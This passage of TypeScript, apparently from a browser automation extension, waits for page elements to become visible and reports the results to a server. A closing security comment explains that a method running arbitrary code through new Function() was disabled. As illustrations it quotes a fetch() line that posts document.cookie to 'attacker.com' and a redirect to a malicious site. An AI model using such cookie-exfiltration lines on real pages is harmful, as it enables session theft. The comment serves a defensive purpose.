                  if (entry.isIntersecting && entry.intersectionRatio >= threshold) {
                    intersectionObserver.disconnect();
                    const waitTime = Date.now() - startTime;
                    resolve({
                      success: true,
                      found: true,
                      waitTime: waitTime,
                      elementInfo: getElementInfo(entry.target)
                    });
                  }
                });
              }, { threshold: threshold });

              intersectionObserver.observe(element);

              // Timeout handler
              setTimeout(() => {
                intersectionObserver.disconnect();
                const waitTime = Date.now() - startTime;
                resolve({
                  success: false,
                  found: false,
                  waitTime: waitTime,
                  elementInfo: getElementInfo(element),
                  error: \`Element "\${selector}" not visible (threshold: \${threshold}) after \${timeout}ms\`
                });
              }, timeout);
            }
          });
        })();
        `,
      });

      const result = results[0];
      const actualWaitTime = Date.now() - startTime;

      if (result.success) {
        await this.client.sendResourceToServer({
          resource: "wait-result",
          correlationId,
          success: true,
          message: `Element "${selector}" became visible after ${result.waitTime}ms`,
          timestamp: Date.now(),
          conditionMet: true,
          waitTime: actualWaitTime,
          elementInfo: result.elementInfo,
        });
      } else {
        await this.client.sendResourceToServer({
          resource: "wait-result",
          correlationId,
          success: false,
          message: result.error || `Element "${selector}" did not become visible after ${timeout}ms`,
          timestamp: Date.now(),
          conditionMet: false,
          waitTime: actualWaitTime,
          elementInfo: result.elementInfo,
        });
      }
    } catch (error) {
      await this.client.sendResourceToServer({
        resource: "wait-result",
        correlationId,
        success: false,
        message: `Wait for element visibility failed: ${error instanceof Error ? error.message : 'Unknown error'}`,
        timestamp: Date.now(),
        conditionMet: false,
        waitTime: 0,
      });
    }
  }

  // SECURITY FIX: waitForCondition method has been disabled due to critical security vulnerability
  //
  // CRITICAL VULNERABILITY DETAILS:
  // This method used `new Function()` to execute arbitrary JavaScript code provided by the user,
  // which allowed complete system compromise. Attackers could:
  // - Steal cookies: `fetch('attacker.com', {method: 'POST', body: document.cookie})`
  // - Redirect users: `window.location = 'malicious-site.com'`
  // - Access any browser API via `window` object
  // - Execute any JavaScript in the content script context
  //
  // The "safe globals" approach was insufficient because:
  // 1. `window` object provided access to all browser APIs
  // 2. `document` object allowed DOM manipulation and data access
  // 3. String interpolation in template literals bypassed pattern checks
  // 4. No effective sandboxing was implemented
  //
  // SECURITY RECOMMENDATION:
  // If condition checking is needed in the future, implement a whitelist-based approach
  // with predefined safe conditions like:
  // - element-exists: Check if selector exists
  // - element-visible: Check if element is visible
  // - element-has-text: Check if element contains specific text
  // - element-has-class: Check if element has specific class
  //
  // DO NOT restore this method without a complete security review.
  
  /*
  private async waitForCondition(
    correlationId: string,
    tabId: number,
    condition: string,
    timeout: number = 5000,
    pollInterval: number = 100,
    args?: Record<string, any>
  ): Promise<void> {
    // METHOD DISABLED FOR SECURITY - See security comments above
    throw new Error("waitForCondition has been permanently disabled for security reasons");
  }
  */
}
